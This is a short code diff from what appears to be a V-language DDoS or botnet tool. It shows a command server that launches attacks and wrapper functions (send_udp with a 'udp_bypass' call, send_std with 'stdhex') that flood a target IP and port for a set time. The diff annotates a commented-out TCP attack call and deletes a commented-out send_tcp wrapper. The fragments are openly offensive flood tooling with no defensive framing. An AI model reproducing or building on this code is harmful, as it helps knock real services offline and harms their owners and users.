@@ -61,7 +61,7 @@ fn server(ip string, port string, pw string) {
 				// 		server.write_string("[ x ] Error, Something went wrong sending attack.....\n") or { return }
 				// 	} else {
 				// 		server.write_string("[ + ] Attack being sent....\n") or { return }
-				// 		go send_tcp(args[1], args[2].int(), args[3].int())
+				// 		go send_tcp(args[1], args[2].int(), args[3].int())  // ip port time len 
 				// 		server.write_string("[ + ] Attack Successfully finished....\n") or { return }
 				// 	}
 				// }
@@ -108,10 +108,6 @@ fn parse_buffer(buff string) (string, string, []string) {
 fn send_udp(ip string, p u16, t int) {
 	C.udp_bypass(&char(ip.str), p, t)
 }
-
-// fn send_tcp(ip string, p int, t int) {
-// 	C.send_tcp(&char(ip.str), p, t)
-// }
 
 fn send_std(ip string, p int, t int) {
 	C.stdhex(&char(ip.str), p, t)
